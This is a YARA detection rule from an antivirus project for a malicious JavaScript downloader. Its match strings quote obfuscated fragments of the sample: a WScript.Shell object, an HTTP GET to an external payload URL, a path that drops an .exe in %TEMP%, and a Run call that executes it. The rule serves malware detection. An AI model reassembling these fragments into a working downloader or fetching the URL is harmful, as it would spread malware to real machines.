rule sig_20160401_c66d5364c4aee1e768eaf7b2fbccd529 {
  meta:
    description = "datamaliciousorder - file 20160401_c66d5364c4aee1e768eaf7b2fbccd529.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af301b1c54801d32a5cf4a0dea4093469fe5e2378409a555222a551a05de5ef0"

  strings:
    $s1  = "function TuxUc(LueQo, QmtUow){OfiOz = OfiOz * 1; return LueQo - QmtUow;};" fullword ascii
    $s2  = "var DtCqw = function MhAvb() {return WScript[HxdAf](\"WScript\"+\".Shell\");}(), PcYjz = 11;" fullword ascii
    $s3  = "JvtWm[UyQb](\"G\" + \"ET\", \"http://grafikeria.pl/o9ows\", false);" fullword ascii
    $s4  = "if (JvtWm[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LnTqd(){return EizFn + \"\";};" fullword ascii
    $s6  = "function DnNg() {return DtCqw[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"XxCT0084aOl.ex\" + \"e\";};" fullword ascii
    $s7  = "function AdhOtq() {return ((GswBir == true) && (GswBir == JcwPi)) ? 1 : OfiOz;};" fullword ascii
    $s8  = "function XrDcz(GbyHl) {var ZtLa = (1, 2, 3, 4, 5, GbyHl); return ZtLa;};" fullword ascii
    $s9  = "GswBir = true; " fullword ascii
    $s10 = "JcwPi = true; " fullword ascii
    $s11 = "function VlIju()" fullword ascii
    $s12 = "var BgWt = new this[\"Date\"]();" fullword ascii
    $s13 = "function ShUdd(XkgTu){DtCqw[\"R\"+\"un\"](XkgTu, OfiOz, OfiOz);};" fullword ascii
    $s14 = "var GtHxr = false;" fullword ascii
    $s15 = "var GswBir = false;" fullword ascii
    $s16 = "function KldYde(){return HxdAf;};" fullword ascii
    $s17 = "return TuxUc(VjcSsg, WzAv);" fullword ascii
    $s18 = "var JcwPi = false;" fullword ascii
    $s19 = "function YfrUs(){return 23;};" fullword ascii
    $s20 = "}while (EyqRhu);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}